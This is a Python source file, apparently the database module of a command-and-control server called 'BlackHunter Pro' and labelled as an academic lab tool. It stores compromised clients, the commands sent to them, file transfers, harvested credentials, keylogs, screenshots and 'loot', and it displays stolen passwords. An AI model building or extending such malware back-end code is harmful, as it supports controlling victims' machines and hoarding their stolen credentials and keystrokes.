#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# c2_server/database.py
# BlackHunter Pro - Database Manager
# SQLite-based storage for clients, commands, results, and loot
# Academic Penetration Testing Tool - Isolated Lab Only

import os
import sys
import json
import time
import sqlite3
import threading
import hashlib
from datetime import datetime, timedelta

# Add parent directory to path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

# =============================================
# CONFIGURATION
# =============================================

DB_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "data")
os.makedirs(DB_DIR, exist_ok=True)
DB_FILE = os.path.join(DB_DIR, "blackhunter.db")

# =============================================
# COLORS
# =============================================

class Colors:
    RED = '\033[0;31m'
    GREEN = '\033[0;32m'
    YELLOW = '\033[1;33m'
    BLUE = '\033[0;34m'
    MAGENTA = '\033[0;35m'
    CYAN = '\033[0;36m'
    WHITE = '\033[1;37m'
    DIM = '\033[2m'
    RESET = '\033[0m'

C = Colors

# =============================================
# LOGGING
# =============================================

def log(message, level="INFO"):
    """Log message"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    colors = {
        "INFO": C.CYAN,
        "OK": C.GREEN,
        "WARN": C.YELLOW,
        "ERROR": C.RED,
        "DB": C.MAGENTA,
    }

    color = colors.get(level, C.WHITE)
    print(f"{color}[{timestamp}] [{level}]{C.RESET} {message}")

# =============================================
# DATABASE MANAGER
# =============================================

class Database:
    """SQLite database manager for C2 server"""

    def __init__(self, db_file=DB_FILE):
        self.db_file = db_file
        self.lock = threading.Lock()
        self.conn = None

        self._connect()
        self._create_tables()

    # =============================================
    # CONNECTION
    # =============================================

    def _connect(self):
        """Establish database connection"""
        try:
            self.conn = sqlite3.connect(
                self.db_file,
                check_same_thread=False,
                timeout=30.0,
            )
            self.conn.row_factory = sqlite3.Row
            self.conn.execute("PRAGMA journal_mode=WAL")
            self.conn.execute("PRAGMA synchronous=NORMAL")
            self.conn.execute("PRAGMA foreign_keys=ON")
            log(f"Database connected: {self.db_file}", "DB")
        except Exception as e:
            log(f"Database connection failed: {e}", "ERROR")
            raise

    def _create_tables(self):
        """Create tables if they don't exist"""
        with self.lock:
            cursor = self.conn.cursor()

            # CLIENTS table
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS clients (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    client_id TEXT UNIQUE NOT NULL,
                    ip TEXT NOT NULL,
                    port INTEGER,
                    hostname TEXT,
                    os TEXT,
                    os_version TEXT,
                    arch TEXT,
                    user TEXT,
                    privileges TEXT,
                    first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    status TEXT DEFAULT 'active',
                    info TEXT
                )
            """)

            # COMMANDS table
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS commands (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    client_id TEXT NOT NULL,
                    command TEXT NOT NULL,
                    sent_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    result TEXT,
                    output TEXT,
                    exit_code INTEGER,
                    duration REAL,
                    status TEXT DEFAULT 'pending',
                    FOREIGN KEY (client_id) REFERENCES clients(client_id)
                )
            """)

            # FILES table (transferred files)
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS files (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    client_id TEXT NOT NULL,
                    filename TEXT NOT NULL,
                    filepath TEXT,
                    local_path TEXT,
                    filesize INTEGER,
                    hash TEXT,
                    direction TEXT,
                    transferred_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    status TEXT DEFAULT 'completed',
                    FOREIGN KEY (client_id) REFERENCES clients(client_id)
                )
            """)

            # CREDENTIALS table (harvested)
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS credentials (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    client_id TEXT,
                    username TEXT,
                    password TEXT,
                    hash TEXT,
                    source TEXT,
                    url TEXT,
                    captured_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    verified INTEGER DEFAULT 0
                )
            """)

            # LOOT table (screenshots, keylogs, etc.)
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS loot (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    client_id TEXT NOT NULL,
                    loot_type TEXT NOT NULL,
                    name TEXT,
                    data TEXT,
                    file_path TEXT,
                    captured_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    FOREIGN KEY (client_id) REFERENCES clients(client_id)
                )
            """)

            # SESSIONS table (server sessions)
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS sessions (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    session_id TEXT UNIQUE NOT NULL,
                    client_id TEXT,
                    started_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    ended_at TIMESTAMP,
                    bytes_sent INTEGER DEFAULT 0,
                    bytes_received INTEGER DEFAULT 0,
                    commands_count INTEGER DEFAULT 0,
                    status TEXT DEFAULT 'active'
                )
            """)

            # LOGS table
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS logs (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    level TEXT,
                    source TEXT,
                    message TEXT
                )
            """)

            # SCREENSHOTS table
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS screenshots (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    client_id TEXT NOT NULL,
                    file_path TEXT,
                    file_size INTEGER,
                    captured_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    FOREIGN KEY (client_id) REFERENCES clients(client_id)
                )
            """)

            # KEYLOGS table
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS keylogs (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    client_id TEXT NOT NULL,
                    window_title TEXT,
                    keystrokes TEXT,
                    captured_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    FOREIGN KEY (client_id) REFERENCES clients(client_id)
                )
            """)

            # NOTES table (analyst notes)
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS notes (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    client_id TEXT,
                    title TEXT,
                    content TEXT,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            """)

            # Create indexes
            cursor.execute("CREATE INDEX IF NOT EXISTS idx_clients_client_id ON clients(client_id)")
            cursor.execute("CREATE INDEX IF NOT EXISTS idx_clients_status ON clients(status)")
            cursor.execute("CREATE INDEX IF NOT EXISTS idx_commands_client_id ON commands(client_id)")
            cursor.execute("CREATE INDEX IF NOT EXISTS idx_commands_sent_at ON commands(sent_at)")
            cursor.execute("CREATE INDEX IF NOT EXISTS idx_files_client_id ON files(client_id)")
            cursor.execute("CREATE INDEX IF NOT EXISTS idx_credentials_client_id ON credentials(client_id)")
            cursor.execute("CREATE INDEX IF NOT EXISTS idx_loot_client_id ON loot(client_id)")
            cursor.execute("CREATE INDEX IF NOT EXISTS idx_logs_timestamp ON logs(timestamp)")

            self.conn.commit()
            log("Database tables created/verified", "DB")

    # =============================================
    # CLIENTS
    # =============================================

    def add_client(self, client_id, ip, port=None, **kwargs):
        """Add or update a client"""
        with self.lock:
            cursor = self.conn.cursor()

            # Check if exists
            cursor.execute("SELECT id FROM clients WHERE client_id = ?", (client_id,))
            existing = cursor.fetchone()

            info_json = json.dumps(kwargs.get('info', {}))

            if existing:
                # Update
                cursor.execute("""
                    UPDATE clients SET
                        last_seen = CURRENT_TIMESTAMP,
                        status = ?,
                        ip = COALESCE(?, ip),
                        port = COALESCE(?, port),
                        hostname = COALESCE(?, hostname),
                        os = COALESCE(?, os),
                        user = COALESCE(?, user),
                        info = COALESCE(?, info)
                    WHERE client_id = ?
                """, (
                    kwargs.get('status', 'active'),
                    ip, port,
                    kwargs.get('hostname'),
                    kwargs.get('os'),
                    kwargs.get('user'),
                    info_json,
                    client_id,
                ))
            else:
                # Insert
                cursor.execute("""
                    INSERT INTO clients (
                        client_id, ip, port, hostname, os, os_version,
                        arch, user, privileges, status, info
                    ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                """, (
                    client_id, ip, port,
                    kwargs.get('hostname'),
                    kwargs.get('os'),
                    kwargs.get('os_version'),
                    kwargs.get('arch'),
                    kwargs.get('user'),
                    kwargs.get('privileges'),
                    kwargs.get('status', 'active'),
                    info_json,
                ))

            self.conn.commit()
            log(f"Client saved: {client_id}", "DB")
            return cursor.lastrowid

    def get_client(self, client_id):
        """Get client by ID"""
        with self.lock:
            cursor = self.conn.cursor()
            cursor.execute("SELECT * FROM clients WHERE client_id = ?", (client_id,))
            row = cursor.fetchone()
            return dict(row) if row else None

    def get_all_clients(self, status=None):
        """Get all clients"""
        with self.lock:
            cursor = self.conn.cursor()

            if status:
                cursor.execute("SELECT * FROM clients WHERE status = ? ORDER BY last_seen DESC", (status,))
            else:
                cursor.execute("SELECT * FROM clients ORDER BY last_seen DESC")

            return [dict(row) for row in cursor.fetchall()]

    def update_client_status(self, client_id, status):
        """Update client status"""
        with self.lock:
            cursor = self.conn.cursor()
            cursor.execute("""
                UPDATE clients SET status = ?, last_seen = CURRENT_TIMESTAMP
                WHERE client_id = ?
            """, (status, client_id))
            self.conn.commit()

    def delete_client(self, client_id):
        """Delete a client and its data"""
        with self.lock:
            cursor = self.conn.cursor()
            cursor.execute("DELETE FROM commands WHERE client_id = ?", (client_id,))
            cursor.execute("DELETE FROM files WHERE client_id = ?", (client_id,))
            cursor.execute("DELETE FROM credentials WHERE client_id = ?", (client_id,))
            cursor.execute("DELETE FROM loot WHERE client_id = ?", (client_id,))
            cursor.execute("DELETE FROM screenshots WHERE client_id = ?", (client_id,))
            cursor.execute("DELETE FROM keylogs WHERE client_id = ?", (client_id,))
            cursor.execute("DELETE FROM clients WHERE client_id = ?", (client_id,))
            self.conn.commit()
            log(f"Client deleted: {client_id}", "DB")

    # =============================================
    # COMMANDS
    # =============================================

    def add_command(self, client_id, command, status='pending'):
        """Add a command to history"""
        with self.lock:
            cursor = self.conn.cursor()
            cursor.execute("""
                INSERT INTO commands (client_id, command, status)
                VALUES (?, ?, ?)
            """, (client_id, command, status))
            self.conn.commit()
            return cursor.lastrowid

    def update_command_result(self, command_id, output, exit_code=0, duration=0, status='completed'):
        """Update command result"""
        with self.lock:
            cursor = self.conn.cursor()
            cursor.execute("""
                UPDATE commands SET
                    output = ?,
                    exit_code = ?,
                    duration = ?,
                    status = ?
                WHERE id = ?
            """, (output, exit_code, duration, status, command_id))
            self.conn.commit()

    def get_commands(self, client_id, limit=100):
        """Get command history for client"""
        with self.lock:
            cursor = self.conn.cursor()
            cursor.execute("""
                SELECT * FROM commands
                WHERE client_id = ?
                ORDER BY sent_at DESC
                LIMIT ?
            """, (client_id, limit))
            return [dict(row) for row in cursor.fetchall()]

    def get_all_commands(self, limit=500):
        """Get all commands"""
        with self.lock:
            cursor = self.conn.cursor()
            cursor.execute("""
                SELECT c.*, cl.hostname, cl.ip
                FROM commands c
                LEFT JOIN clients cl ON c.client_id = cl.client_id
                ORDER BY c.sent_at DESC
                LIMIT ?
            """, (limit,))
            return [dict(row) for row in cursor.fetchall()]

    # =============================================
    # FILES
    # =============================================

    def add_file(self, client_id, filename, filepath, local_path,
                 filesize, file_hash, direction='download'):
        """Add file transfer record"""
        with self.lock:
            cursor = self.conn.cursor()
            cursor.execute("""
                INSERT INTO files (
                    client_id, filename, filepath, local_path,
                    filesize, hash, direction
                ) VALUES (?, ?, ?, ?, ?, ?, ?)
            """, (client_id, filename, filepath, local_path,
                  filesize, file_hash, direction))
            self.conn.commit()
            return cursor.lastrowid

    def get_files(self, client_id=None, limit=100):
        """Get file transfer history"""
        with self.lock:
            cursor = self.conn.cursor()

            if client_id:
                cursor.execute("""
                    SELECT * FROM files WHERE client_id = ?
                    ORDER BY transferred_at DESC LIMIT ?
                """, (client_id, limit))
            else:
                cursor.execute("""
                    SELECT f.*, c.hostname FROM files f
                    LEFT JOIN clients c ON f.client_id = c.client_id
                    ORDER BY f.transferred_at DESC LIMIT ?
                """, (limit,))

            return [dict(row) for row in cursor.fetchall()]

    # =============================================
    # CREDENTIALS
    # =============================================

    def add_credential(self, username, password=None, password_hash=None,
                       client_id=None, source=None, url=None):
        """Add harvested credential"""
        with self.lock:
            cursor = self.conn.cursor()
            cursor.execute("""
                INSERT INTO credentials (
                    client_id, username, password, hash, source, url
                ) VALUES (?, ?, ?, ?, ?, ?)
            """, (client_id, username, password, password_hash, source, url))
            self.conn.commit()
            return cursor.lastrowid

    def get_credentials(self, client_id=None, limit=500):
        """Get harvested credentials"""
        with self.lock:
            cursor = self.conn.cursor()

            if client_id:
                cursor.execute("""
                    SELECT * FROM credentials WHERE client_id = ?
                    ORDER BY captured_at DESC LIMIT ?
                """, (client_id, limit))
            else:
                cursor.execute("""
                    SELECT cr.*, c.hostname FROM credentials cr
                    LEFT JOIN clients c ON cr.client_id = c.client_id
                    ORDER BY cr.captured_at DESC LIMIT ?
                """, (limit,))

            return [dict(row) for row in cursor.fetchall()]

    def get_credential_stats(self):
        """Get credential statistics"""
        with self.lock:
            cursor = self.conn.cursor()
            cursor.execute("SELECT COUNT(*) as total FROM credentials")
            total = cursor.fetchone()['total']

            cursor.execute("SELECT COUNT(DISTINCT username) as users FROM credentials")
            users = cursor.fetchone()['users']

            cursor.execute("SELECT COUNT(DISTINCT client_id) as clients FROM credentials WHERE client_id IS NOT NULL")
            clients = cursor.fetchone()['clients']

            return {
                'total': total,
                'unique_users': users,
                'clients': clients,
            }

    # =============================================
    # LOOT
    # =============================================

    def add_loot(self, client_id, loot_type, name, data=None, file_path=None):
        """Add loot item"""
        with self.lock:
            cursor = self.conn.cursor()
            cursor.execute("""
                INSERT INTO loot (client_id, loot_type, name, data, file_path)
                VALUES (?, ?, ?, ?, ?)
            """, (client_id, loot_type, name, data, file_path))
            self.conn.commit()
            return cursor.lastrowid

    def get_loot(self, client_id=None, loot_type=None, limit=200):
        """Get loot items"""
        with self.lock:
            cursor = self.conn.cursor()

            query = "SELECT * FROM loot WHERE 1=1"
            params = []

            if client_id:
                query += " AND client_id = ?"
                params.append(client_id)

            if loot_type:
                query += " AND loot_type = ?"
                params.append(loot_type)

            query += " ORDER BY captured_at DESC LIMIT ?"
            params.append(limit)

            cursor.execute(query, params)
            return [dict(row) for row in cursor.fetchall()]

    # =============================================
    # SCREENSHOTS
    # =============================================

    def add_screenshot(self, client_id, file_path, file_size):
        """Add screenshot record"""
        with self.lock:
            cursor = self.conn.cursor()
            cursor.execute("""
                INSERT INTO screenshots (client_id, file_path, file_size)
                VALUES (?, ?, ?)
            """, (client_id, file_path, file_size))
            self.conn.commit()

    def get_screenshots(self, client_id=None, limit=50):
        """Get screenshots"""
        with self.lock:
            cursor = self.conn.cursor()

            if client_id:
                cursor.execute("""
                    SELECT * FROM screenshots WHERE client_id = ?
                    ORDER BY captured_at DESC LIMIT ?
                """, (client_id, limit))
            else:
                cursor.execute("""
                    SELECT s.*, c.hostname FROM screenshots s
                    LEFT JOIN clients c ON s.client_id = c.client_id
                    ORDER BY s.captured_at DESC LIMIT ?
                """, (limit,))

            return [dict(row) for row in cursor.fetchall()]

    # =============================================
    # KEYLOGS
    # =============================================

    def add_keylog(self, client_id, window_title, keystrokes):
        """Add keylog entry"""
        with self.lock:
            cursor = self.conn.cursor()
            cursor.execute("""
                INSERT INTO keylogs (client_id, window_title, keystrokes)
                VALUES (?, ?, ?)
            """, (client_id, window_title, keystrokes))
            self.conn.commit()

    def get_keylogs(self, client_id=None, limit=100):
        """Get keylogs"""
        with self.lock:
            cursor = self.conn.cursor()

            if client_id:
                cursor.execute("""
                    SELECT * FROM keylogs WHERE client_id = ?
                    ORDER BY captured_at DESC LIMIT ?
                """, (client_id, limit))
            else:
                cursor.execute("""
                    SELECT k.*, c.hostname FROM keylogs k
                    LEFT JOIN clients c ON k.client_id = c.client_id
                    ORDER BY k.captured_at DESC LIMIT ?
                """, (limit,))

            return [dict(row) for row in cursor.fetchall()]

    # =============================================
    # SESSIONS
    # =============================================

    def create_session(self, session_id, client_id):
        """Create a session record"""
        with self.lock:
            cursor = self.conn.cursor()
            cursor.execute("""
                INSERT INTO sessions (session_id, client_id)
                VALUES (?, ?)
            """, (session_id, client_id))
            self.conn.commit()

    def end_session(self, session_id):
        """End a session"""
        with self.lock:
            cursor = self.conn.cursor()
            cursor.execute("""
                UPDATE sessions SET ended_at = CURRENT_TIMESTAMP, status = 'ended'
                WHERE session_id = ?
            """, (session_id,))
            self.conn.commit()

    def get_sessions(self, limit=100):
        """Get all sessions"""
        with self.lock:
            cursor = self.conn.cursor()
            cursor.execute("""
                SELECT * FROM sessions ORDER BY started_at DESC LIMIT ?
            """, (limit,))
            return [dict(row) for row in cursor.fetchall()]

    # =============================================
    # LOGS
    # =============================================

    def add_log(self, level, source, message):
        """Add log entry"""
        with self.lock:
            cursor = self.conn.cursor()
            cursor.execute("""
                INSERT INTO logs (level, source, message)
                VALUES (?, ?, ?)
            """, (level, source, message))
            self.conn.commit()

    def get_logs(self, limit=1000):
        """Get logs"""
        with self.lock:
            cursor = self.conn.cursor()
            cursor.execute("""
                SELECT * FROM logs ORDER BY timestamp DESC LIMIT ?
            """, (limit,))
            return [dict(row) for row in cursor.fetchall()]

    def clear_logs(self, days=7):
        """Clear old logs"""
        with self.lock:
            cursor = self.conn.cursor()
            cursor.execute("""
                DELETE FROM logs WHERE timestamp < datetime('now', '-' || ? || ' days')
            """, (days,))
            self.conn.commit()
            log(f"Cleared logs older than {days} days", "DB")

    # =============================================
    # NOTES
    # =============================================

    def add_note(self, title, content, client_id=None):
        """Add analyst note"""
        with self.lock:
            cursor = self.conn.cursor()
            cursor.execute("""
                INSERT INTO notes (client_id, title, content)
                VALUES (?, ?, ?)
            """, (client_id, title, content))
            self.conn.commit()
            return cursor.lastrowid

    def get_notes(self, client_id=None):
        """Get notes"""
        with self.lock:
            cursor = self.conn.cursor()

            if client_id:
                cursor.execute("SELECT * FROM notes WHERE client_id = ? ORDER BY updated_at DESC", (client_id,))
            else:
                cursor.execute("SELECT * FROM notes ORDER BY updated_at DESC")

            return [dict(row) for row in cursor.fetchall()]

    def update_note(self, note_id, title=None, content=None):
        """Update note"""
        with self.lock:
            cursor = self.conn.cursor()

            if title and content:
                cursor.execute("UPDATE notes SET title = ?, content = ?, updated_at = CURRENT_TIMESTAMP WHERE id = ?",
                               (title, content, note_id))
            elif title:
                cursor.execute("UPDATE notes SET title = ?, updated_at = CURRENT_TIMESTAMP WHERE id = ?",
                               (title, note_id))
            elif content:
                cursor.execute("UPDATE notes SET content = ?, updated_at = CURRENT_TIMESTAMP WHERE id = ?",
                               (content, note_id))

            self.conn.commit()

    def delete_note(self, note_id):
        """Delete note"""
        with self.lock:
            cursor = self.conn.cursor()
            cursor.execute("DELETE FROM notes WHERE id = ?", (note_id,))
            self.conn.commit()

    # =============================================
    # STATISTICS
    # =============================================

    def get_stats(self):
        """Get overall statistics"""
        with self.lock:
            cursor = self.conn.cursor()

            stats = {}

            cursor.execute("SELECT COUNT(*) as count FROM clients")
            stats['total_clients'] = cursor.fetchone()['count']

            cursor.execute("SELECT COUNT(*) as count FROM clients WHERE status = 'active'")
            stats['active_clients'] = cursor.fetchone()['count']

            cursor.execute("SELECT COUNT(*) as count FROM commands")
            stats['total_commands'] = cursor.fetchone()['count']

            cursor.execute("SELECT COUNT(*) as count FROM files")
            stats['total_files'] = cursor.fetchone()['count']

            cursor.execute("SELECT COUNT(*) as count FROM credentials")
            stats['total_credentials'] = cursor.fetchone()['count']

            cursor.execute("SELECT COUNT(*) as count FROM loot")
            stats['total_loot'] = cursor.fetchone()['count']

            cursor.execute("SELECT COUNT(*) as count FROM screenshots")
            stats['total_screenshots'] = cursor.fetchone()['count']

            cursor.execute("SELECT COUNT(*) as count FROM keylogs")
            stats['total_keylogs'] = cursor.fetchone()['count']

            # Total file size transferred
            cursor.execute("SELECT COALESCE(SUM(filesize), 0) as total FROM files")
            stats['total_bytes'] = cursor.fetchone()['total']

            return stats

    # =============================================
    # CLEANUP
    # =============================================

    def vacuum(self):
        """Vacuum database (optimize)"""
        with self.lock:
            self.conn.execute("VACUUM")
            self.conn.commit()
            log("Database vacuumed", "DB")

    def backup(self, backup_file=None):
        """Backup database"""
        if backup_file is None:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            backup_file = os.path.join(DB_DIR, f"backup_{timestamp}.db")

        with self.lock:
            try:
                backup_conn = sqlite3.connect(backup_file)
                self.conn.backup(backup_conn)
                backup_conn.close()
                log(f"Backup created: {backup_file}", "OK")
                return backup_file
            except Exception as e:
                log(f"Backup failed: {e}", "ERROR")
                return None

    def close(self):
        """Close database connection"""
        with self.lock:
            if self.conn:
                self.conn.close()
                self.conn = None
                log("Database closed", "DB")

    # =============================================
    # DISPLAY
    # =============================================

    def show_stats(self):
        """Display statistics"""
        stats = self.get_stats()

        print(f"""
{C.CYAN}╔═══════════════════════════════════════════════════════╗
{C.CYAN}║{C.WHITE}              DATABASE STATISTICS                     {C.CYAN}║
{C.CYAN}╠═══════════════════════════════════════════════════════╣
{C.CYAN}║{C.GREEN}  Total Clients:       {C.WHITE}{stats['total_clients']:<30}{C.CYAN}║
{C.CYAN}║{C.GREEN}  Active Clients:      {C.WHITE}{stats['active_clients']:<30}{C.CYAN}║
{C.CYAN}║{C.GREEN}  Total Commands:      {C.WHITE}{stats['total_commands']:<30}{C.CYAN}║
{C.CYAN}║{C.GREEN}  Total Files:         {C.WHITE}{stats['total_files']:<30}{C.CYAN}║
{C.CYAN}║{C.GREEN}  Total Credentials:   {C.WHITE}{stats['total_credentials']:<30}{C.CYAN}║
{C.CYAN}║{C.GREEN}  Total Loot:          {C.WHITE}{stats['total_loot']:<30}{C.CYAN}║
{C.CYAN}║{C.GREEN}  Screenshots:         {C.WHITE}{stats['total_screenshots']:<30}{C.CYAN}║
{C.CYAN}║{C.GREEN}  Keylogs:             {C.WHITE}{stats['total_keylogs']:<30}{C.CYAN}║
{C.CYAN}║{C.GREEN}  Data Transferred:    {C.WHITE}{self._format_bytes(stats['total_bytes']):<30}{C.CYAN}║
{C.CYAN}╚═══════════════════════════════════════════════════════╝{C.RESET}
""")

    def _format_bytes(self, bytes_val):
        """Format bytes"""
        for unit in ['B', 'KB', 'MB', 'GB']:
            if bytes_val < 1024:
                return f"{bytes_val:.2f} {unit}"
            bytes_val /= 1024
        return f"{bytes_val:.2f} TB"

    def show_clients(self):
        """Display all clients"""
        clients = self.get_all_clients()

        if not clients:
            log("No clients in database", "WARN")
            return

        print(f"\n{C.CYAN}╔════════════════════════════════════════════════════════════════════════╗")
        print(f"║{C.WHITE}                          CLIENTS ({len(clients)})                                {C.CYAN}║")
        print(f"╠══════════╦═══════════════════╦═══════════════╦═══════════════╦═════════════╣")
        print(f"║{C.WHITE}    ID    {C.CYAN}║{C.WHITE}       IP          {C.CYAN}║{C.WHITE}    HOSTNAME   {C.CYAN}║{C.WHITE}      OS       {C.CYAN}║{C.WHITE}   STATUS    {C.CYAN}║")
        print(f"╠══════════╬═══════════════════╬═══════════════╬═══════════════╬═════════════╣")

        for client in clients:
            cid = client['client_id'][:8]
            ip = (client['ip'] or 'unknown')[:17]
            hostname = (client['hostname'] or 'unknown')[:13]
            os_info = (client['os'] or 'unknown')[:13]
            status = client['status'] or 'unknown'

            status_color = C.GREEN if status == 'active' else C.RED if status == 'dead' else C.YELLOW

            print(f"║ {C.GREEN}{cid:<8}{C.CYAN} ║ {C.WHITE}{ip:<17}{C.CYAN} ║ {C.WHITE}{hostname:<13}{C.CYAN} ║ {C.WHITE}{os_info:<13}{C.CYAN} ║ {status_color}{status:<11}{C.CYAN} ║")

        print(f"╚══════════╩═══════════════════╩═══════════════╩═══════════════╩═════════════╝{C.RESET}\n")

    def show_credentials(self, client_id=None):
        """Display credentials"""
        creds = self.get_credentials(client_id)

        if not creds:
            log("No credentials found", "WARN")
            return

        print(f"\n{C.CYAN}╔════════════════════════════════════════════════════════════════════════╗")
        print(f"║{C.WHITE}                        CREDENTIALS ({len(creds)})                              {C.CYAN}║")
        print(f"╠══════════════╦══════════════════════╦════════════════════════════════════╣")
        print(f"║{C.WHITE}   CLIENT    {C.CYAN}║{C.WHITE}      USERNAME        {C.CYAN}║{C.WHITE}           PASSWORD / HASH             {C.CYAN}║")
        print(f"╠══════════════╬══════════════════════╬════════════════════════════════════╣")

        for cred in creds[:50]:
            cid = (cred['client_id'] or 'N/A')[:12]
            username = (cred['username'] or 'N/A')[:20]
            password = cred['password'] or cred['hash'] or 'N/A'
            password = password[:34]

            print(f"║ {C.GREEN}{cid:<12}{C.CYAN} ║ {C.WHITE}{username:<20}{C.CYAN} ║ {C.RED}{password:<34}{C.CYAN} ║")

        print(f"╚══════════════╩══════════════════════╩════════════════════════════════════╝{C.RESET}\n")

# =============================================
# GLOBAL DATABASE INSTANCE
# =============================================

_db = None
_db_lock = threading.Lock()

def get_db():
    """Get global database instance"""
    global _db

    with _db_lock:
        if _db is None:
            _db = Database()

    return _db

# =============================================
# ALIASES
# =============================================

DatabaseManager = Database

# =============================================
# EXPORTS
# =============================================

__all__ = [
    'Database',
    'DatabaseManager',
    'get_db',
]